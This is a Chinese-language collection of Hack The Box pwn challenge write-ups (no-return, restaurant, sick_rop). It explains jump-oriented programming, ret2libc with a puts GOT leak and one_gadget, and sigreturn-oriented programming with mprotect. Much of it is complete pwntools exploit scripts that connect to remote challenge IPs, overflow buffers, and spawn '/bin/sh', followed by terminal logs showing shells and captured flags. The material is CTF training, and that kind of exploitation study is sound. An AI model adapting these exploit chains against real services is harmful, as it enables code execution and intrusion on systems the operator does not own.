<p class="kb-provenance">来源 noreturn · 原记录 2021-01-05 · 8 个代码块 · 1 处图片引用</p>

<details class="kb-evidence" id="record-noreturn">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start noreturn -->

#### 详细过程及exp

no return 是一道极具挑战性的pwn，首先很容易的将这个程序逆向，输入一些内容来溢出它会泄露堆栈地址。

``` bash
int main()
{
    write(1, &return_address, 8);
    read(0, rsp-0xb0, 0xc0);
    __asm_volatile("add rsp, 0x8; jmp rsp");
}
```



在最后，它跳回了顶端，非常有趣，当搜索gadgets时，只有非常少量的以ret结尾的gadgets（只有一个不重合的gadget被ropper找到），因此这个挑战的名字叫no return，然而，ropper之后展示了很多以JOP结尾的gadgets，使我想到了JOP链。

网上没有很多关于JOP链的资源，下面是我自己用到的：

 - [Concept of Jump-Oriented-Programming JOP](https://security.stackexchange.com/questions/201196/concept-of-jump-oriented-programming-jop)
 - [Jump-Oriented Programming A New Class of Code-ReuseAttack](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)

在那之后也写了一篇非常基础的关于JOPs的文章在博客上

 - [Jump Oriented Programming and Call Oriented Programming JOP and PCOP](https://www.willsroot.io/2019/09/jump-oriented-programming-and-call.html)

基本的想法是一旦能使链移动，想让它跳转到dispatcher gadget然后设置一个dispatch表。那个dispatch表指向在寄存器上以一个跳转结束的gadgets，所以能使它返回到dispatcher，至于dispatcher gadget, 它的目的是使寄存器递增到指向下一个在dispatch表的gadget然后跳转到那儿，和平常一样dump出整个程序:

``` bash
0x401000: pop rsp
0x401001: pop rdi
0x401002: pop rsi
0x401003: pop rbp
0x401004: pop rdx
0x401005: pop rcx
0x401006: pop rbx
0x401007: xor rax,rax
0x40100a: jmp QWORD PTR [rdi+0x1]
0x40100d: inc rax
0x401010: fdivrp st(1),st
0x401012: jmp QWORD PTR [rdx]
0x401014: sub rsi,QWORD PTR [rsp+0x10]
0x401019: cmc
0x40101a: jmp QWORD PTR [rdx]
0x40101c: mov rcx,rsp
0x40101f: std
0x401020: jmp QWORD PTR [rdx]
0x401022: lea rcx,[rcx+rbx*8]
0x401026: std
0x401027: jmp QWORD PTR [rcx]
0x401029: xor rbp,rdx
0x40102c: setne ah
0x40102f: jmp QWORD PTR [rbp-0x17bc0000]
0x401035: add rsp,rsi
0x401038: fdivp st(1),st
0x40103a: jmp QWORD PTR [rdx]
0x40103c: add rbp,rbx
0x40103f: fwait
0x401040: jmp QWORD PTR [rbp-0x39]
0x401043: mov BYTE PTR [rdi-0x17bc0000],ah
0x401049: stc
0x40104a: jmp QWORD PTR [rdx]
0x40104c: pop rcx
0x40104d: mov rcx,rdx
0x401050: pop rdx
0x401051: jmp QWORD PTR [rcx]
0x401053: inc rcx
0x401056: fdivrp st(1),st
0x401058: jmp QWORD PTR [rdx]
0x40105a: xchg rdx,rax
0x40105c: fdivp st(1),st
0x40105e: jmp QWORD PTR [rcx]
0x401060: inc rbx
0x401063: fdivrp st(1),st
0x401065: jmp QWORD PTR [rdx]
0x401067: xchg rdi,rcx
0x40106a: std
0x40106b: jmp QWORD PTR [rdx]
0x40106d: push rsp
0x40106e: xor rax,rax
0x401071: inc rax
0x401074: xor rdi,rdi
0x401077: inc rdi
0x40107a: mov rsi,rsp
0x40107d: mov edx,0x8
0x401082: syscall
0x401084: sub rsi,0xb0
0x40108b: xor rax,rax
0x40108e: xor rdi,rdi
0x401091: lea rsi,[rsi]
0x401094: mov edx,0xc0
0x401099: syscall
0x40109b: add rsp,0x8
0x40109f: jmp QWORD PTR [rsp-0x8]
```

现在开始搜索一些gadgets,我们的终极目标是pop一个shell，使用明显的syscall gadget, 去找一个execve("/bin/sh", 0, 0)。

第一个看起来对控制寄存器初始化跳转和设置很有帮助。需要重设buffer基址的堆栈然后从那pop地址进寄存器，所以之后能影响控制流然后控制rdi跳转（和不重合的帮助）。

``` bash
0x401000: pop rsp
0x401001: pop rdi
0x401002: pop rsi
0x401003: pop rbp
0x401004: pop rdx
0x401005: pop rcx
0x401006: pop rbx
0x401007: xor rax,rax
0x40100a: jmp QWORD PTR [rdi+1]
```

如果在buffer的dispatch表之前使rbx 8和rbx point 8字节，以下会是很好的dispatcher gadget:

``` bash
0x40103c: add rbp,rbx
0x40103f: fwait
0x401040: jmp QWORD PTR [rbp-0x39]
```

在继续之前，重要的是注意到很多以下的gadgets都以rcx和rdx跳跃结尾，所以使它们指向回dispatcher gadget很重要。

为了设置 /bin/sh，下面两个gadgets会被用到:

``` bash
0x401067: xchg rdi,rcx
0x40106a: std
0x40106b: jmp QWORD PTR [rdx]
```

``` bash
0x40101c: mov rcx,rsp
0x40101f: std
0x401020: jmp QWORD PTR [rdx]
```

这两个都依赖rcx跳回dispatcher，rdx不需要被很好的保存。当它第一次pops 进入rcx，它获取了什么不重要。然后它会移动rdx(指向dispatcher)进到rcx.确保59 pop进入rdx。当这个xchg gadget被击中时, rdx会变成0（在第一次使用的pop链中rax被置空）然后rax会变成59.得到了dispatch表然后走到syscall gadget会打开一个shell。

这是最终的exploit代码（调试部分对观察程序流和jmp关系很重要）：

``` bash
from pwn import *
import sys

p = remote('167.99.86.47', int(sys.argv[1]))
#p = process('./no-return')
#context.log_level = 'debug'

#for debugging, attach when prompt for read, and then just hit step
stackleak = u64(p.recv(8))
log.info("Stack leak:" + hex(stackleak))
bufferbase = stackleak - 0xb0

payload = (p64(0x40103c) + p64(bufferbase-0x8-0x1) #rdi
    + p64(0) #rsi
    + p64(bufferbase+0x30+0x8+0x39) #rbp, remember to adjust to dispatch table, will do later, and make it 0x8 lower because of the add instruction
    + p64(bufferbase-0x8) #rdx
    + p64(bufferbase-0x8) #rcx
    + p64(0x8) #rbx, so it becomes good incrementation for dispatch table
    + "/bin/sh\x00" + p64(59) #rsp will point there, two pops until rdx, so that will be good
    + p64(0x401067) #dispatch to xchg gadget for rdi and rcx
    + p64(0x40101c) #mov rsp address to rcx
    + p64(0x401067) #restore dispatcher to rcx, mov /bin/sh to rdi
    + p64(0x40104c) #set rdx to 59
    + p64(0x40105a) #rdx to null, rax to rdx old rdi value, which is 59
    + p64(0x401099) #syscall
    + '').ljust(0xb0, 'A') + p64(0x401000) + p64(bufferbase)
p.sendline(payload)
p.interactive()
```

运行脚本获取flag:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/noreturn]
└─# python getshell.py 32664
[+] Opening connection to 178.62.0.100 on port 32664: Done
[*] Stack leak:0x7ffdebc61b20
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt
no-return
run_challenge.sh
$ cat 11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt
HTB{y0uv3_35c4p3d_7h3_v01d_0f_n0_r37urn}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb137.jpg)

<!-- kb:end noreturn -->

</details>

<a id="case-pwn-restaurant"></a>

## 两阶段 ret2libc 与接收时序

菜单执行一次即退出，需要先通过 GOT 泄漏再回到易受攻击函数。原文保留 64 位输入空字节、puts 地址和收发等待问题。

<p class="kb-provenance">来源 pwn-restaurant · 原记录 2021-05-08 · 18 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-pwn-restaurant">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pwn-restaurant -->

#### 详细过程及exp - 1

这道题通常的pwn题没什么两样。和以前的问题不同的是，菜单不会重复。只要做出一次选择，binary就会结束。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# file restaurant
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# checksec restaurant
[*] '/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



这里关系到full relro, NX 开启。而且，libc已经给了，所以可以用oneshot来写。

只要输入1就可以填满食物，输入2就可以选择喝的东西。输入1时，

下面是ghidra中的伪代码

``` bash
void fill(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  color("\nYou can add these ingredients to your dish:","green",&DAT_00401144);
  puts("\n1. 🍅\n2. 🧀");
  color("You can also order something else.\n> ","green",&DAT_00401144);
  read(0,local_28&,0x400);
  printf("\nEnjoy your %s",&local_28);
  return;
}
```

local_28(0x20)可以输入0x400，所以只要往这里overflow就可以了。

找到了libc base值后，就用oneshot打就可以了。

 - 下面先在ghidra中找地址:

undefined8 main(void)

``` bash
00400f68 55              PUSH       RBP
所以：
main = 0x0000000000400F68
```

``` bash
void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  
  _init(param_1);
  lVar1 = 0;
  do {
    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff,param_2,param_3)
    ;
    lVar1 += 1;
  } while (lVar1 != 1);
  return; // 双击此处
}
```

``` bash
004010a2 41 5f           POP        R15
004010a4 c3              RET
所以：
prdi = 0x00000000004010a3
```

双击.got，然后往下翻即可看到PTR_puts_00601fa8

``` bash
                        PTR_puts_00601fa8                               XREF[1]:     puts:00400650  
00601fa8 00 30 60        addr       puts                                             = ??
            00 00 00 
            00 00
所以：
putsgot = 0x0000000000601FA8
```

在functions中双击puts函数即可

``` bash
00400650 ff 25 52        JMP        qword ptr [->puts]                               int puts(char * __s)
            19 20 00
所以：
puts = 0x0000000000400650
```

双击.bss

``` bash
bss = 0x0000000000602800
```

在functions中双击fill函数即可

``` bash
00400e4a    55          PUSH       RBP
所以：
fill = 0x0000000000400E4A
```

在fill函数中定位: read(0,&local_28,0x400);

``` bash
00400ebc 48 8d 45 e0     LEA        RAX=>local_28,[RBP + -0x20]
所以：
read = 0x0000000000400EBC
```

 - getshell.py

``` bash
# please use python2.7

from pwn import *
import argparse

main = 0x0000000000400F68
prdi = 0x00000000004010a3
putsgot = 0x0000000000601FA8
puts = 0x0000000000400650
bss = 0x0000000000602800
fill = 0x0000000000400E4A
read = 0x0000000000400EBC

def exp():
    p.sendlineafter("> ", "1")

    payload = ""
    payload += "A"*0x20
    payload += p64(bss)
    payload += p64(prdi)
    payload += p64(putsgot)
    payload += p64(puts)
    payload += p64(main)

    p.sendafter("> ", payload)

    p.recvuntil("A"*0x20)

    puts_g = u64(p.recv(6) + "\x00\x00")
    print "puts_g address:", hex(puts_g)
    libc = puts_g - 0x80aa0
    print "libc address:", hex(libc)
    oneshot = libc + 0x4f432
    print "oneshot address:", hex(oneshot)

    p.sendlineafter("> ", "1")

    payload2 = ""
    payload2 += "B"*0x20
    payload2 += p64(bss)
    payload2 += p64(read)
    p.sendafter("> ", payload2)

    #p.recvuntil("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
    raw_input()
    payload3 = "C"*0x28
    payload3 += p64(oneshot)

    p.send(payload3)
    print "[+] You Have Successfully Got The shell..."
    p.interactive()

if __name__ == '__main__' :
    context.arch = 'amd64'
    #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    p = remote("46.101.5.30", 32022)
    exp()
```

运行脚本，得到flag:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# python getshell.py                                                                                                                            
[+] Opening connection to 46.101.5.30 on port 32022: Done
puts_g address: 0x7fb82ace4aa0
libc address: 0x7fb82ac64000
oneshot address: 0x7fb82acb3432

[+] Successfully Got The shell:
[*] Switching to interactive mode

Enjoy your BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Enjoy your CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC24�*\xb8\x7f$
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
flag.txt
libc.so.6
restaurant
run_challenge.sh
$ cat flag.txt
HTB{r3turn_2_th3_r3st4ur4nt!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn.jpg)

#### 详细过程及exp - 2
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# file restaurant 
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# checksec restaurant
[*] '/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### 2. Run binary in GDB chose the first option and input 44B of data:

One thing to notice, data cannot be bigger than 44B, because it will overwrite the RSP register, thus breaking the stack frame.

Although this gives the ability to take control of only the first 4 bytes of the RIP register, which is not enough to spawn the shell since NX bit is enabled

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn1.jpg)

First phase exploit.py

``` bash
from pwn import *

p = process("./restaurant")
gdb.attach(p,'''c
''')
p.sendline("1")
p.recv()
p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaAAAABBBB")
p.recv()

p.interactive()
```

#### 3. Control full 8 Byte return address:

As being said if data is bigger than 44B it breaks the stack frame by overwriting the RSP register and after the RET instruction, binary crash.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn2.jpg)

(1) There are some trash bytes in the RSP register.

In order to get rid of them, use the \x00 (null byte) at the end of the input and (2) RET instruction will follow the instruction from RSP register.

Chose an instruction to follow from the binary f.e. 0x0000000000400f75 which is in fact <+13>: call 0x400dfd <setup> in main()

Set a breakpoint at this address and send the payload

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn3.jpg)

#### 4. ASLR bypass:

ASLR does not affect the base address of the restaurant binary.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn4.jpg)

The libc library used on the target machine was made available in the challenge package. To calculate the base libc address, it will be needed to be leaked puts() address from libc during binary execution and its dynamic symbol address from libc before execution.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# objdump -T libc.so.6 | grep puts
0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts
0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts
0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent
0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent
000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs
000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs
000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked
```

There is a possibility to redirect the execution to puts() (which is not affected by ASLR) and leak the puts_got address from libc after randomization, thus bypassing ASLR security.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn5.jpg)

#### 5. NX bit bypass:

Since there is NX bit enabled, shellcode on stack won't work, but there is libc delivered with the restaurant binary which can be used for the ROP gadget# or one_gadget as described in the [PWN Format challenge - HTB](https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a).

Additionally rsp+0x40 has to be set to \x00

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# objdump -T libc.so.6 | grep puts
one_gadget libc.so.6
0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts
0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts
0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent
0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent
000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs
000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs
000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Added one-second sleep between sending and receiving data to mitigate connection issues. The script counted addresses faster than obtained data.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn6.jpg)

#### 6. Final exploit:

``` python
from pwn import *
import time
context.arch = "amd64"
#context.log_level = 'debug'
elf = ELF("./restaurant")

#p = process("./restaurant") 
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so") # local exploit
#rop = ROP("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#gdb.attach(p,'''b * 0x00000000004010a3
#c''')

p = remote("188.166.173.208", 31974)
libc = ELF("./libc.so.6") # remote exploit

# Leaking libc base => puts() + main() + puts@got ---
print("\n--- Leaking puts:")
puts_got = elf.got["puts"] # got entry for puts()
puts_plt = elf.plt["puts"] # puts() from binary
pop_rdi_ret = 0x00000000004010a3 # pop rdi; ret 
main_addr = elf.symbols["main"]
log.success("puts@got address: 0x%x" %(puts_got))
p.sendline("1")
p.recv()

# 1st ROP - [set rdi => arg1 for puts] [arg1 = puts@got] [call puts] [ret to main]
p.sendline("A"*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr))
time.sleep(1)
leak = p.recv()
l = leak.find("\xa3\x10\x40") + 3 
puts_libc = u64(leak[l:l+6].ljust(8,"\x00"))
log.success("Puts addr from libc: " + hex(puts_libc))
print("\n --- Calculating libc base:")
base_libc = puts_libc - 0x0000000000080aa0
log.success("Base libc addr: " + hex(base_libc))

# ---
# Calculating one_gadget and overflowing again to its address ---
one_gadget = base_libc + 0x4f432
p.sendline("1")
p.recv()
p.sendline("A"*40 + p64(one_gadget) + "\x00"*0x50)
time.sleep(1)
p.recv()

# ---
p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]
└─# python pwnexp.py 
[*] '/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 188.166.173.208 on port 31974: Done
[*] '/root/hackthebox/challenge/pwn/pwn_restaurant/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

--- Leaking puts:
[+] puts@got address: 0x601fa8
[+] Puts addr from libc: 0x7fb91db82aa0

 --- Calculating libc base:
[+] Base libc addr: 0x7fb91db02000
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
flag.txt
libc.so.6
restaurant
run_challenge.sh
$ cat flag.txt
HTB{r3turn_2_th3_r3st4ur4nt!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn7.jpg)
<!-- kb:end pwn-restaurant -->

</details>

<a id="case-sick-rop"></a>

## read 返回值与 sigreturn frame

可用 gadget 不足时，原解法利用 read 返回值设置 RAX，再以 SigreturnFrame 配置寄存器。mprotect 页范围及第二段跳转完整保留。

<p class="kb-provenance">来源 sick-rop · 原记录 2021-01-11 · 18 个代码块 · 16 处图片引用</p>

<details class="kb-evidence" id="record-sick-rop">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start sick-rop -->

#### 详细过程及exp - 1

与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# checksec sick_rop
[*] '/root/hackthebox/challenge/pwn/sickrop/sick_rop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

发现NX是启用的，这实际上意味着不能执行堆栈的内容部分。但是，还发现PIE没有启用，这意味着主二进制文件在内存中有一个从地址0x400000开始的静态位置。打开IDA中的二进制文件并分析它，以了解它的功能。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop.jpg)

看到二进制很简单。它运行一个无限循环，调用一个名为vuln的函数。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop1.jpg)

vuln函数从标准输入读取768 (0x300)字节到位于rsp-0x20的缓冲区，然后将相同的缓冲区写回标准输出。因此，可以得出结论，可以在偏移量0x20处溢出缓冲区。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop2.jpg)

read函数非常简单，只调用sys_read系统调用。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop3.jpg)

write函数非常直接，只调用sys_write系统调用。

然而，由于NX启用了二进制文件，不能直接执行栈的内容，因此必须使用其他方法，如ROP gadget。拿出选择ROP gadget(在本例中是ropper)并加载sick_rop二进制文件。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# ropper
(ropper)> file sick_rop
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(sick_rop/ELF/x86_64)> gadgets



Gadgets
=======


0x0000000000401009: add byte ptr [rax - 0x75], cl; je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401020: add byte ptr [rax - 0x75], cl; je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401008: add byte ptr [rax], al; mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x0000000000401012: and al, 0x10; syscall; 
0x0000000000401012: and al, 0x10; syscall; ret; 
0x000000000040100d: and al, 8; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100d: and al, 8; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x0000000000401040: call 0x1000; push rax; push r10; call 0x1017; leave; ret; 
0x0000000000401048: call 0x1017; leave; ret; 
0x0000000000401044: call qword ptr [rax + 0x41]; 
0x0000000000401044: call qword ptr [rax + 0x41]; push rdx; call 0x1017; leave; ret; 
0x000000000040104c: dec ecx; ret; 
0x000000000040100c: je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x000000000040100c: je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401023: je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401023: je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401041: mov ebx, 0x50ffffff; push r10; call 0x1017; leave; ret; 
0x0000000000401010: mov edx, dword ptr [rsp + 0x10]; syscall; 
0x0000000000401010: mov edx, dword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100b: mov esi, dword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100b: mov esi, dword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100f: mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100f: mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100a: mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100a: mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100e: or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x000000000040100e: or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401046: push r10; call 0x1017; leave; ret; 
0x0000000000401045: push rax; push r10; call 0x1017; leave; ret; 
0x0000000000401047: push rdx; call 0x1017; leave; ret; 
0x0000000000401011: push rsp; and al, 0x10; syscall; 
0x0000000000401011: push rsp; and al, 0x10; syscall; ret; 
0x0000000000401049: retf 0xffff; dec ecx; ret; 
0x000000000040104d: leave; ret; 
0x0000000000401016: ret; 
0x0000000000401014: syscall; 
0x0000000000401014: syscall; ret; 

37 gadgets found
```

然后滚动这些gadgets，看看是否可以找到一个系统调用gadgets，因为需要一个gadgets来直接生成一个带有ROP链的shell。

``` bash
0x000000000040104d: leave; ret; 
0x0000000000401016: ret; 
0x0000000000401014: syscall; 
0x0000000000401014: syscall; ret; 
```

正如上图所示，能够找到一个系统调用gadget。现在，需要找到使用syscall gadget执行execve调用所需的gadget。64位的execve系统调用如下所示。

``` bash
 Name	  RAX	     RDI	   RSI	   RDX
execve	  0x3b	   filepath    argv	   envp
```

因此，需要gadget，将允许修改rax, rdi, rsi和rdx。有趣的是，没有找到足够的gadgets来在二进制文件中执行这些操作，因此必须找到另一个方法。因为能够使用vuln函数中的缓冲区溢出来执行ROP，所以如果能够以某种方式控制rax寄存器，就可以利用Sigreturn-Oriented 编程(SROP)。一个64位的rt_sigreturn系统调用要求rax设置为15 (0x0f)，并且一个sigcontext结构驻留在堆栈上。

有趣的是，vuln函数终止时的rax值是write函数的返回值，这是使用sys_write系统调用写入的缓冲区的长度。因此，如果输入一个长度为15的缓冲区，其中包含任意内容，程序将输出相同的缓冲区，并在使用ROP返回到系统调用指令之前将rax设置为0x0f。然后，需要做的就是在与ROPgadget相邻的堆栈上定义一个sigcontext，用于系统调用指令。

堆栈上的sigcontext结构如下所示。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop4.jpg)

从上图中可以看出，sigcontext结构大于0x0f字节，因此缓冲区的长度超过了在到达系统调用指令时控制rax的必要标准。如果回到vuln函数在堆栈的顶部,其次是的系统调用指令和sigcontext结构,可以迫使应用程序重复请求一个输入的过程,而这一次插入一个缓冲区长度15字节,因此保留堆栈从之前的溢出而控制伸出的价值。

因此，使用SROP，能够在调用新的系统调用指令之前控制所有寄存器。然而，不知道二进制文件中任何 '/bin/sh' 字符串的位置，也不知道堆栈的地址。因此，需要找到一种方法来定位或生成 '/bin/sh' 字符串。

如果可以找到一个具有读/写权限的位置，那么可以使用SROP gadget将rsp寄存器(也就是栈)指向一个可选择的地址。接下来，可以重用vuln中的缓冲区溢出，将 '/bin/sh' 写入堆栈上的已知位置，并再次调用SROP gadget。这一次，用execve系统调用的值填充寄存器，并返回到系统调用指令。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# strings sick_rop
rop.asm
read
write
vuln
__bss_start
_edata
_end
.symtab
.strtab
.shstrtab
.text
```

正如在上面所看到的 '.symtab' 字符串存在于二进制文件中，告诉这个二进制文件已经与一个符号表相链接。结合这个事实，vuln函数被命名，可以得出结论，一个符号表存在于二进制文件中。这是一个不会影响流程运行时行为的领域，因此这是在第一个SROP gadget中重新定位堆栈的理想目的地。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# grep -obUaP "\x2e\x10\x40\x00" ./sick_rop
4312:.@
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# python -c 'print "%x" % 4312'
10d8
```

在符号表中找到指向vuln的指针的偏移量，如上所示。然而，符号表在默认情况下是不可写的，因此第一个SROP gadget必须调用mprotect系统调用，以便使符号表可写，并为第二个SROP gadget做好准备。

现在可以构建一个脚本来执行这些步骤。最终的脚本应该如下所示。

 - getshell.py

``` bash
from pwn import * 
context.arch = "amd64"
vuln_fn = 0x40102e      # vuln function
syscall = 0x401014      # gadget [syscall; ret;]
s = remote("178.128.175.172", 32672)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x0a        # mprotect
frame.rdi = 0x401000    # base address
frame.rsi = 0x1000      # size
frame.rdx = 7           # permission (rwx)
frame.rsp = 0x4010d8    # symtab pointer to 'vuln'
frame.rip = syscall
buf = '\x90' * 0x28
buf += p64(vuln_fn)
buf += p64(syscall)
buf += str(frame)
s.send(buf)
s.recv(1024)
s.send('\x90' * 0xf)    # eax = 0x0f before syscall
s.recv(1024)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b        # execve
frame.rdi = 0x4011e8    # filename ('/bin/sh')
frame.rsi = 0           # argv
frame.rdx = 0           # envp
frame.rsp = 0
frame.rip = syscall
buf = '\x90' * 0x28
buf += p64(vuln_fn)     # address: 0x4010e0
buf += p64(syscall)
buf += str(frame)
buf += '/bin/sh'        # address: 0x4011e8
buf += '\x00'
s.send(buf)
s.recv(1024)
s.send('\x90' * 0xf)    # eax = 0x0f before syscall
s.recv(1024)
s.interactive()
s.close()
```

 - 运行脚本成功拿到flag

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# python getshell.py 
[+] Opening connection to 178.128.175.172 on port 32672: Done
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
